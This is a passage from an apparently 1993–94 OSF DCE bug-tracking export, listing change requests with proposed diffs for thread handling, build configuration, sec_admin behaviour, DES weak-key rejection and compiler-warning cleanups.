S/W Ref Platform              : osf1
Component Name                : thr
Subcomponent Name             : 
Short Description             : thread_resume not applied to cached threads
Reported Date                 : 8/18/93
Found in Baseline             : 1.0.2
Found Date                    : 8/18/93
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : threads/cma_vp.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/18/93 public]

The code in cma__vp_resume, uses the thread_resume system call
only for vp's marked as "new"; it should also do this for vp's marked
"cached".

Proposed Solution:

*** cma_vp.c    Tue Dec 15 18:35:26 1992
--- /users/xxxxx/cma_vp.c    Wed Aug 18 17:16:27 1993
***************
*** 1035,1041 ****
      kern_return_t     status;


!     if (!(vpid->flags & cma__c_vp_new)) {
        msg_header_t    mhdr;


--- 1035,1041 ----
      kern_return_t     status;


!     if (!(vpid->flags & (cma__c_vp_new | cma__c_vp_cached))) {
        msg_header_t    mhdr;


***************
*** 1059,1065 ****

        }
      else {
!       vpid->flags &= ~cma__c_vp_new;
        vpid->flags |= cma__c_vp_running;

        if ((status = thread_resume (vpid->vp)) != KERN_SUCCESS) {
--- 1059,1065 ----

        }
      else {
!       vpid->flags &= ~(cma__c_vp_new | cma__c_vp_cached);
        vpid->flags |= cma__c_vp_running;

        if ((status = thread_resume (vpid->vp)) != KERN_SUCCESS) {



CR Number                     : 8455
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : thr
Subcomponent Name             : 
Short Description             : _CMA_HARDWARE_ definition fails when compiling with gcc -ansi flag
Reported Date                 : 8/16/93
Found in Baseline             : 1.0.3
Found Date                    : 8/16/93
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/16/93 public]

The file dce/cma_config.h tests for the symbol i386 when checking
for the machine type. Instead, it should check for __i386__ 
since i386 is undefined when -ansi is passed to gcc on OSF/1.

The affected code:

# if !defined(SNI_SVR4)
#  ifdef i386
#   define       _CMA_HARDWARE_  _CMA__I386
#  endif
# endif
# ifndef _CMA_HARDWARE_
   !!!Error: _CMA_HARDWARE_ not set
# endif
#endif

The symptom (fatal compilation error):
In file included from /project/dce/build/dce1.0.2a/src/threads/cma.h:137, from ../../../src/threads/cma_stdio.c:214:
/usr/sandbox/rhw/sb/dce103i/export/at386/usr/include/dce/cma_config.h:402: parse error before `!'

This should be a DCE 1.1 code cleanup item.

[08/16/93 public]
This work is in the project plan for 1.1 as part of the code cleanup.



CR Number                     : 8429
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : dfs_config
Short Description             : System Control Machine installation
installs the universe
Reported Date                 : 8/10/93
Found in Baseline             : 1.0.3
Found Date                    : 8/10/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/10/93 public]

The System Control machine installs many more dfs binaries than it needs
to ; it is only using bos* and upclient/upserver, why install everything
else if we don't have to.  It also loads kernel extensions - does
the system control machine need kernel extentions to run?



CR Number                     : 8421
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : clumsy architecture specific code
Reported Date                 : 8/6/93
Found in Baseline             : 1.0.2
Found Date                    : 8/6/93
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : threads/cma_vp.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/6/93 public]

Customer is porting DCE to kernel theads, which meant they needed to
modify cma_vp.c for their architecture. They found this difficult to
do, and suggested the following changes to make it such work simpler.
Also note that they modified the functions cma__vp_interrupt and 
cma__vp_resume to return a value of type consistent with their definition.
Before this last change these functions behaved as procedures.

*** ../../link/link/src/threads/cma_vp.c	Tue Dec 15 18:35:26 1992
--- cma_vp.c	Fri Aug  6 17:23:57 1993
***************
*** 127,132 ****
--- 127,140 ----
  # include <mach.h>
  # include <mach_error.h>
  # include <mach/machine/syscall_sw.h>
+ # if _CMA_HARDWARE_ == _CMA__MIPS
+ #  define NATIVE_THREAD_STATE        MIPS_THREAD_STATE
+ #  define NATIVE_THREAD_STATE_COUNT  MIPS_THREAD_STATE_COUNT
+ # endif
+ # if _CMA_HARDWARE_ == _CMA__ALPHA
+ #  define NATIVE_THREAD_STATE        ALPHA_THREAD_STATE
+ #  define NATIVE_THREAD_STATE_COUNT  ALPHA_THREAD_STATE_COUNT
+ # endif
  #endif
  
  /*
***************
*** 927,938 ****
  
      if ((status = thread_get_state (
  	    vpid->vp,
! # if _CMA_HARDWARE_ == _CMA__MIPS
! 	    MIPS_THREAD_STATE,
! # endif
! # if _CMA_HARDWARE_ == _CMA__ALPHA
! 	    ALPHA_THREAD_STATE,
! # endif
  	    (thread_state_t)&state_array,
  	    &state_count)) != KERN_SUCCESS) {
  	cma__trace ((
--- 935,941 ----
  
      if ((status = thread_get_state (
  	    vpid->vp,
! 	    NATIVE_THREAD_STATE,
  	    (thread_state_t)&state_array,
  	    &state_count)) != KERN_SUCCESS) {
  	cma__trace ((
***************
*** 956,974 ****
  
      if ((status = thread_set_state (
  	    vpid->vp,
! # if _CMA_HARDWARE_ == _CMA__MIPS
! 	    MIPS_THREAD_STATE,
! # endif
! # if _CMA_HARDWARE_ == _CMA__ALPHA
! 	    ALPHA_THREAD_STATE,
! # endif
  	    (thread_state_t)&state_array,
! # if _CMA_HARDWARE_ == _CMA__MIPS
! 	    MIPS_THREAD_STATE_COUNT)) != KERN_SUCCESS) {
! # endif
! # if _CMA_HARDWARE_ == _CMA__ALPHA
! 	    ALPHA_THREAD_STATE_COUNT)) != KERN_SUCCESS) {
! # endif
  	cma__trace ((
  		cma__c_trc_vp | cma__c_trc_bug,
  		"(vp_interrupt) error \"%s\" (%d) setting state on vp %d",
--- 959,967 ----
  
      if ((status = thread_set_state (
  	    vpid->vp,
! 	    NATIVE_THREAD_STATE,
  	    (thread_state_t)&state_array,
! 	    NATIVE_THREAD_STATE_COUNT)) != KERN_SUCCESS) {
  	cma__trace ((
  		cma__c_trc_vp | cma__c_trc_bug,
  		"(vp_interrupt) error \"%s\" (%d) setting state on vp %d",
***************
*** 991,996 ****
--- 984,990 ----
  	cma__bugcheck ("vp_interrupt: thread_resume");
  	}
  
+     return(cma_c_vp_normal);
  #else
      cma__bugcheck ("vp_interrupt: no VPs");
  #endif
***************
*** 1073,1078 ****
--- 1067,1073 ----
  	    }
  
  	}
+     return(cma_c_vp_normal);
  #else
      cma__bugcheck ("vp_resume: no VPs");
  #endif
***************
*** 1189,1202 ****
      struct alpha_thread_state	thd_state;
  # endif
      int				*stack_array;
- # if _CMA_HARDWARE_ == _CMA__MIPS
-     int				state_count =
MIPS_THREAD_STATE_COUNT;
- # endif
- # if _CMA_HARDWARE_ == _CMA__ALPHA
-     int				state_count =
ALPHA_THREAD_STATE_COUNT;
- # endif
  
- 
      stack_array = (int *)(state->stack - (2 * sizeof (int)));
      stack_array[0] = state->tcb;	/* a0 */
      stack_array[1] = 0;			/* Clear out a null a1 */
--- 1184,1190 ----
***************
*** 1205,1220 ****
      thd_state.pc = (int)cma__execute_thread;
      status = thread_set_state (
  	    vpid->vp,
! # if _CMA_HARDWARE_ == _CMA__MIPS
! 	    MIPS_THREAD_STATE,
  	    (thread_state_t)&thd_state,
! 	    MIPS_THREAD_STATE_COUNT);
! # endif
! # if _CMA_HARDWARE_ == _CMA__ALPHA
! 	    ALPHA_THREAD_STATE,
! 	    (thread_state_t)&thd_state,
! 	    ALPHA_THREAD_STATE_COUNT);
! # endif
  
      return status;
  #endif
--- 1193,1201 ----
      thd_state.pc = (int)cma__execute_thread;
      status = thread_set_state (
  	    vpid->vp,
! 	    NATIVE_THREAD_STATE,
  	    (thread_state_t)&thd_state,
! 	    NATIVE_THREAD_STATE_COUNT);
  
      return status;
  #endif



CR Number                     : 8419
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : thr
Subcomponent Name             : 
Short Description             : port_disable status interpretation
Reported Date                 : 8/6/93
Found in Baseline             : 1.0.2
Found Date                    : 8/6/93
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : threads/cma_vp.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/6/93 public]

[8/6/93 public]

When using Mach kernel threads The function cma__init_vp in the file
threads/cma_vp.c calls port_disable

    if (status != KERN_SUCCESS) {
	cma__trace ((
		cma__c_trc_init | cma__c_trc_vp | cma__c_trc_bug,
		"(init_vp) error \"%s\" (%d) allocating def. VP synch port",
		mach_error_string (status),
		status));
	cma__bugcheck ("init_vp: port_allocate");
	}

port_disable is actually and obsoleted Mach call, which has been remapped to
a call to port_set_remove. port_set_remove is capable of returning
KERN_NOT_IN_SET which should be treated by cma__init_vp in the same manner
as KERN_SUCCESS. Therefore, the customer's recommendation is that we change
the three calls to port_diable which appear in cma__init_vp to the following
form:

    status = port_disable (task, synch_port);
    if ((status != KERN_SUCCESS) && (status != KERN_NOT_IN_SET)) {
	cma__trace ((
		cma__c_trc_init | cma__c_trc_vp | cma__c_trc_bug,
		"(init_vp) error \"%s\" (%d) disabling port %d",
		mach_error_string (status),
		status,
		synch_port));
	cma__bugcheck ("init_vp: port_disable");
	}



CR Number                     : 8407
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : cfg
Subcomponent Name             : 
Short Description             : msgcats installed with too many permissions
Reported Date                 : 8/3/93
Found in Baseline             : 1.0.3
Found Date                    : 8/3/93
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/3/93 public]
All the message catalogs in the install tree (and therefore on an installed
system) have permissions: -rwxr-xr-x  They should only have -r--r--r--.
This happens on the HP and 486 so I assume that it happens on all
platforms, although I haven't checked.

[8/24/94 public]
Here is the current (non-DFS) state of things in 1.1:
surf>ls -l /opt/dcelocal/nls/msg/en_US.ASCII/
total 968
-rwxr-xr-x   1 bin      bin                6640 Aug 22 19:44 dceaud.cat*
-r--r--r--   1 bin      bin               30690 Aug 22 19:44 dcecds.cat
-rwxr-xr-x   1 bin      bin                 660 Aug 22 19:43 dcecsr.cat*
-rwxr-xr-x   1 bin      bin               45831 Aug 22 19:44 dcedcp.cat*
-r--r--r--   1 bin      bin                2477 Aug 22 19:44 dcedhd.cat
-r--r--r--   1 bin      bin                9526 Aug 22 19:44 dcedts.cat
-rwxr-xr-x   1 bin      bin               64895 Aug 22 19:43 dcegds.cat*
-rwxr-xr-x   1 bin      bin               22487 Aug 22 20:07 dcegss.cat*
-rwxr-xr-x   1 bin      bin                 871 Aug 23 00:04 dcekdb.cat*
-rwxr-xr-x   1 bin      bin                  93 Aug 23 00:04 dcekdc.cat*
-rwxr-xr-x   1 bin      bin                8085 Aug 23 00:04 dcekrb.cat*
-r--r--r--   1 bin      bin                1695 Aug 23 01:25 dcelib.cat
-r--r--r--   1 bin      bin               12549 Aug 22 19:43 dcerpc.cat
-rwxr-xr-x   1 bin      bin               13251 Aug 22 19:44 dcesad.cat*
-rwxr-xr-x   1 bin      bin               24240 Aug 22 19:44 dcesec.cat*
-r--r--r--   1 bin      bin                 744 Aug 23 01:20 dcesvc.cat
-rwxr-xr-x   1 bin      bin               19261 Aug 23 01:28 dcetcl.cat*
-r--r--r--   1 bin      bin                2284 Aug 22 23:41 dcethd.cat
-r--r--r--   1 bin      bin                 645 Aug 22 23:41 dceuid.cat
-rwxr-xr-x   1 bin      bin                 454 Aug 23 00:11 gdsclhelp.cat*
-rwxr-xr-x   1 bin      bin               53040 Aug 23 00:11 gdsditadm.cat*
-rwxr-xr-x   1 bin      bin              112102 Aug 23 00:11 gdsdithelp.cat*
-rwxr-xr-x   1 bin      bin                 723 Aug 23 00:11 gdsproc.cat*
-rwxr-xr-x   1 bin      bin                8694 Aug 23 00:11 gdssysadm.cat*
-rwxr-xr-x   1 bin      bin                7150 Aug 23 00:11 gdssyshelp.cat*
-rwxr-xr-x   1 bin      bin               22343 Aug 22 19:38 idl.cat*
-rwxr-xr-x   1 bin      bin                3748 Aug 23 00:58 xoserr.cat*

I am assigning to Howard to he can either:
	- fix it (change IMODES in all component makefiles that install
		  message catalogs)

	- cancel it (accept the fact that no vendor uses our dce_config
		     install scripts)

	- defer it (entrtain some vain hope that there will be someone
		    who will care enough to fix these makefile for 1.2)



CR Number                     : 8403
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec_admin
Short Description             : sec_admin gives wrong err on "site <replist_name> -u"
Reported Date                 : 8/2/93
Found in Baseline             : 1.0.2
Found Date                    : 8/2/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : client/admin/sec_admin/sec_admin.c
Sensitivity                   : public

[8/2/93 public]
sec_admin won't bind to master when using slave replist name and -u flag:

-#> sec_admin -s /.:/subsys/dce/sec/repl1
Default replica:  /.../rep.cell.austin.ibm.com/subsys/dce/sec/repl1
Default cell:     /.../rep.cell.austin.ibm.com
sec_admin> site subsys/dce/sec/repl1 -u
Unable to bind to master registry - ERROR - Registry server unavailable (dce / sec)
sec_admin> lrep
Default replica:  /.../rep.cell.austin.ibm.com/subsys/dce/sec/repl1
Default cell:     /.../rep.cell.austin.ibm.com


subsys/dce/sec/master (master)

subsys/dce/sec/repl1
sec_admin> lrep -state
Default replica:  /.../rep.cell.austin.ibm.com/subsys/dce/sec/repl1
Default cell:     /.../rep.cell.austin.ibm.com


subsys/dce/sec/master (master)
          State:                   in service - master
          Last update received at: Tue Jul 13 13:44:45 1993
          Last update's seqno:     0.203

subsys/dce/sec/repl1
          State:                   in service - slave
          Last update received at: Tue Jul 13 13:44:45 1993
          Last update's seqno:     0.203
sec_admin> h site
Usage: site [name [-u[pdate]]]
sec_admin> site subsys/dce/sec/repl1 -u
Unable to bind to master registry - ERROR - Registry server unavailable (dce / sec)
sec_admin> site subsys/dce/sec/master
Default replica:  /.../rep.cell.austin.ibm.com/subsys/dce/sec/master
Default cell:     /.../rep.cell.austin.ibm.com
sec_admin> 

It works ok if global name or just cellname is used:

-#> sec_admin
Default replica:  /.../rep.cell.austin.ibm.com/subsys/dce/sec/repl1
Default cell:     /.../rep.cell.austin.ibm.com
sec_admin> site /.: -u
Default replica:  /.../rep.cell.austin.ibm.com/subsys/dce/sec/master
Default cell:     /.../rep.cell.austin.ibm.com
sec_admin> site subsys/dce/sec/repl1
Default replica:  /.../rep.cell.austin.ibm.com/subsys/dce/sec/repl1
Default cell:     /.../rep.cell.austin.ibm.com
sec_admin> site subsys/dce/sec/repl1 -u
Unable to bind to master registry - ERROR - Registry server unavailable (dce / sec)
sec_admin> site /.:/subsys/dce/sec/repl1 -u
Default replica:  /.../rep.cell.austin.ibm.com/subsys/dce/sec/master
Default cell:     /.../rep.cell.austin.ibm.com
sec_admin> site subsys/dce/sec/repl1
Default replica:  /.../rep.cell.austin.ibm.com/subsys/dce/sec/repl1
Default cell:     /.../rep.cell.austin.ibm.com
sec_admin> site subsys/dce/sec/repl1 -u
Unable to bind to master registry - ERROR - Registry server unavailable (dce / sec)
sec_admin> quit
bye.

[08/18/93 public]
This isn't supposed to work.  You cannot bind to the master with just the
replist name (the replist name functionality is only there to bind to a
specific replica) because you must use sec_rgy_site_bind_update() to get to
a master, and it requires a global name.  The site command should be fixed
so that it doesn't allow -u with a non global name (ie: give a better error
than just "Registry server unavailable").

[08/18/93 public]
Based on Mike's info, the sec_admin manpage needs to be changed too.  The
version I have (DCE 1.0.2) states that you can use a replist 
name to bind to the master:

site subcommand
site [ name [-u[pdate]] ]
                    Set or display the default cell and the default
                    replica.

                    The name argument identifies the replica to set as
                    the default replica and, as a consequence, the
                    default cell.  It can be:
                                .
                                .
                                .
                      o  The name of a replica as it appears on the
                         replica list to make the named replica (which
                         exists in the default cell) the default
                         replica.
                                .
                                .
                                .
                    The -u option specifies that sec_admin should find
                    the master replica. Normally you specify the name
                    of a cell for name in conjunction with the -u
                    option.  In this case sec_admin finds the master
                    replica in that cell. If you use a replica name
                    for name, sec_admin queries the named replica to
                    find the master replica in the named replica's
                    cell.

Perhaps this should be changed to a doc defect?

[7/27/94 public]
This CR either does not affect dcecp or has a related CR open.
It really belongs to sec_admin and should not be assigned to dcecp.

[8/1/94 public]
All control program bugs are being changed to E4 due to the existance
of dcecp.



CR Number                     : 8401
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : sec_admin
Short Description             : (DIFF) sec_admin monitor subcmd accepts
negative intervals
Reported Date                 : 8/2/93
Found in Baseline             : 1.0.2
Found Date                    : 8/2/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/client/admin/sec_admin/sec_admin.c
Sensitivity                   : public

[8/2/93 public]
The sec_admin monitor subcommand accepts negative values as time
intervals.  The simple fix is to the tty_do_monitor routine in
sec_admin.c:

-#> diff -c sec_admin.c sec_admin.new
*** sec_admin.c Mon Aug  2 13:59:42 1993
--- sec_admin.new       Mon Aug  2 14:00:09 1993
***************
*** 222,228 ****
      case 3:
          if (match_command("-r", c->args[1], 2)) {
              minutes = strtol(c->args[2], (char **)NULL, 10);
!             if ((minutes==0) || (minutes==LONG_MAX) || (minutes==LONG_MIN)) {
                  fprintf(stderr,
                    "%s is not a legal integer value or is out of range\n",
                      c->args[2]);
--- 222,228 ----
      case 3:
          if (match_command("-r", c->args[1], 2)) {
              minutes = strtol(c->args[2], (char **)NULL, 10);
!             if ((minutes<=0) || (minutes==LONG_MAX) || (minutes==LONG_MIN)) {
                  fprintf(stderr,
                    "%s is not a legal integer value or is out of range\n",
                      c->args[2]);

[7/27/94 public]
This CR either does not affect dcecp or has a related CR open.
It really belongs to sec_admin and should not be assigned to dcecp.

[8/1/94 public]
All control program bugs are being changed to E4 due to the existance
of dcecp.



CR Number                     : 8383
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : DES
Short Description             : DES key generation should avoid "pseudo-weak" keys.
Reported Date                 : 7/28/93
Found in Baseline             : 1.0
Found Date                    : 7/28/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/28/93 public]

In the interests of completeness and paranoia, our DES key generation
should avoid the "pseudo-weak keys" cited in _Cryptography: An Introduction
to Computer Security_, by Seberry and Pierprzyk (of the Univ. of New South
Wales).  Thanks to Walt Tuvell for noticing this one..

DES keys are converted into a 16-element "key schedule", each element of
which is logically a 48-bit quantity containing 48 of the 56 bits of the
key.

If all subkeys in the key schedule are the same, the cryptographic strength
of DES is significantly weakened; by analogy, if there are only a few
different subkeys, the algorithm is somewhat weakened.

There are four "weak" keys (with only one distinct subkey) and twelve
"semi-weak" keys (with two subkeys); there is also a set of 48 keys (which
I will call "pseudo-weak"; S&P only refers to them as "other keys") which
have only four distinct subkeys.

Currently we only reject the "weak" and "semi-weak" keys in key generation.
We should detect and reject the "pseudo-weak" keys, either in key schedule
generation (as we do for "weak" keys), or in key generation itself.  I
prefer doing this in key schedule generation for sanity checking, though it
might break communication between an old and new DCE if the old DCE picks a
pseudo-weak key.  Note that is slightly less than 1 chance in 1.5e15 of
this happening; I believe that this is in the same order of magnitude as an
undetected multiple bit error on most communications and storage media, so
I'm not going to worry about backwards compatibility in this case.



CR Number                     : 8371
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : thr
Subcomponent Name             : cma_stdio
Short Description             : cma does not provide wrapper for sscanf
Reported Date                 : 7/27/93
Found in Baseline             : 1.0.3
Found Date                    : 7/27/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[7/27/93 public]
On AIX the function sscanf appears to be non-reentrant.  However, the
CMA wrapper for sscanf is turned off by default.  This means that any
threaded application that uses sscanf is at risk for intermittent
failures.
In my case I found that test_anode failed intermittently in 1.0.3 which
uses the native pthread functions (instead of the LWP wrappers built out
of pthreads primitives).
I have a 176 line test program that only uses DFS's osi.h and
<pthread.h> which exhibits this problem.  I have not looked at the
source to sscanf to determine why it is written non-reentrantly.
I can provide further details upon request.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[8/18/93 public]

As currently implemented, CMA provides a stub for sscanf on those platforms
which have vsscanf (vsscanf is not required by POSIX). Since sscanf has a
variable length argument list, there is no way in ANSI C to write a macro 
which provides the requested wrapper. This is why this CR is being changed 
from a defect to an enhancement to provide a vsscanf function. Application 
writers are advised to avoid using sscanf() for the time being (on AIX).



CR Number                     : 8360
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : Statement not reached and extraneous ";" cause compilation warnings.
Reported Date                 : 7/23/93
Found in Baseline             : 1.0.2
Found Date                    : 7/23/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : in security/client/admin/rgy_edit form.c tty_acct.c
Sensitivity                   : public

[7/23/93 public]

In form.c:

There is an extraneous ";" after the closing brace of the function
definition for form_num_fields().

In tty_acct.c (line 1673 in DCE1.0.2):

        } while (true);

>       SET_AND_EXIT_ON_ERROR(&st);
>       return st;

The marked statements are never reached.

[8/2/93 public]

Fixed as part of code cleanup for 1.1.  Assigned to sec_bat.



CR Number                     : 8327
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : sec
Subcomponent Name             : 
Short Description             : argument/parameter incompatability
Reported Date                 : 7/20/93
Found in Baseline             : 1.0.2
Found Date                    : 7/20/93
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/server/sec_clientd/sec_clientd.c
Sensitivity                   : public

[7/20/93 public]

Full Description:

The following warning is produced during the compilation of
security/server/sec_clientd/sec_clientd.c because the 2nd parameter
of scd_thread_join is declared as a void **, and this piece of code is
trying to pass an argument of & (unsigned long *).

../../../../../src/security/server/sec_clientd/sec_clientd.c: In function
main:
../../../../../src/security/server/sec_clientd/sec_clientd.c:688: warning:
argument passing between incompatible pointer types

Proposed Solution:

	change the definition of result_p to be of type pointer to void:

	void *result_p = &result;



CR Number                     : 8325
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : simplification of krb5_add32_nowrap
Reported Date                 : 7/20/93
Found in Baseline             : 1.0.2
Found Date                    : 7/20/93
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/krb5/kdc/kdc_util.c
Sensitivity                   : public

[7/20/93 public]

    I just got a service call complaining of a compiler warning from the
the line 

    krb5_int32 sign_bit = ~((~(unsigned)0) & ((~(unsigned)0) >> 1));

of the function krb5_add32_nowrap in the file security/krb5/kdc/kdc_util.c.
The caller suggested the following change, 

    krb5_int32 sign_bit = (krb5_int32) ~((~(unsigned)0) & ((~(unsigned)0)
>> 1));

I took a closer look at the function, and it ocurred to me that a
simplification might be in order. The existing information uses the
expression (variable & sign_bit) to determine the sign of a variable.
It seems to me that equivalent functionality could be accomplished by
uniformly replacing these expressions with expressions of the form
(variable < 0) or (variable >=0). An example of substitution with
the (variable < 0) expression would look like the following).

Simplfying the function in this manner would eliminate the compiler
warning.

-------------
/*
 * add two signed integers, clipping the result to INT32_MAX or
 * INT32_MIN rather than wrapping around on overflow.
 */

krb5_int32 krb5_add32_nowrap(a, b)
    krb5_int32 a;
    krb5_int32 b;
{
    krb5_int32 sum;
    sum = a + b;

    /* 
     * The following assumes twos-complement binary arithmetic.
     * If you don't like it, fix your ALU.
     * 
     * We overflow if sign(a) == sign(b) && sign(sum) != sign(a) 
     */
    if (((a < 0) ^ (b < 0)) == 0)
    {
	if ((a < 0) ^ (sum < 0)) 
	{
	    /* we overflowed */
	    if (a < 0) 
	    {
		sum = KRB5_INT32_MIN;
	    } else 
	    {
		sum = KRB5_INT32_MAX;
	    }
	}
    }
    return sum;
}



CR Number                     : 8322
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : ANSI-C compiler warning at comparison between signed and unsigned arithmetic types.
Reported Date                 : 7/20/93
Found in Baseline             : 1.0.2
Found Date                    : 7/20/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/client/login/sec_login_np.c
Sensitivity                   : public

[7/20/93 public]
In security/client/login/sec_login_np.c the line "&& len < strlen(name)" in
the following code fragment:

PUBLIC  void  sec_login_pvt_get_local_login_info
...
                else {
                    dce_cf_get_cell_name(&my_cell, &lst);
                    if (GOOD_STATUS(&lst)) {
                        int len;

                        len = strlen(my_cell);
                        if (strncmp(name, my_cell, len) == 0
                        && len < strlen(name)
                        && name[len] != '\0') {
                            /*  add 1 to get past '/' separator */
...
	
causes some ANSI-C compilers to generate a warning. Why not replace the
declaration "int len" with "unsigned len" (or maybe size_t len)?

[8/2/93 public]

Fixed as part of code cleanup for 1.1.  Changed to enhancement
until 1.0.3 ships.



CR Number                     : 8318
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : redefinition of pthread_equal_np
Reported Date                 : 7/19/93
Found in Baseline             : 1.0.2
Found Date                    : 7/19/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/server/sec_clientd/scd_thread.c,security/server/rs/rwl.c
Sensitivity                   : public

[7/19/93 public]

scd_thread.c redefines macro pthread_eqaul_np. The original definition
occurs in pthread.h which is included in scd_thread.c.

Proposed solution:

	It doesn't appear necessary for scd_thread.c to define
pthread_eqaul_np. Alternatively, compiler warning could be extinguished
by bracketing the definition of pthread_equal_np in scd_thread.c
with

	#ifndef pthread_equal_np

	...

	#endif.

[10/28/93 public]

similar problem was discovered in security/server/rs/rwl.c which
includes un_maloc.h which includes krb5/osf_dce.h which includes
thread.h, which results in previous definition of pthread_equal_np.

Proposed solution:

	same as above, first determin if the definition
        should be removed form rwl.c, and if not then
        bracketing the definition of pthread_equal_np in rwl.c
        as follows

	#ifdef pthread_equal
+	#ifndef pthread_equal_np

        #define pthread_equal_np pthread_equal

+       #endif
	#endif

	Note that the following comment appears in rwl.c

/****  SNI_SEC_MERGE: Check to see if the following code is not required
                      because pthread_equal_np is already defined to be
                      the equivalent of pthread_equal
****/



CR Number                     : 8316
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : sec
Subcomponent Name             : 
Short Description             : warning: argument passing of pointer from integer lacks a cast
Reported Date                 : 7/19/93
Found in Baseline             : 1.0.2
Found Date                    : 7/19/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/krb5/comerr/com_err.c
Sensitivity                   : public

[7/19/93 public]

Full Description:

	At approximately line 109 there is a call to fputs which uses as
it's first argument the returned value from a call to error_message.

	fputs(error_message(code), stderr);

error_message is defined in security/krb5/comerr/error_message.c as

	const char * error_message (code)

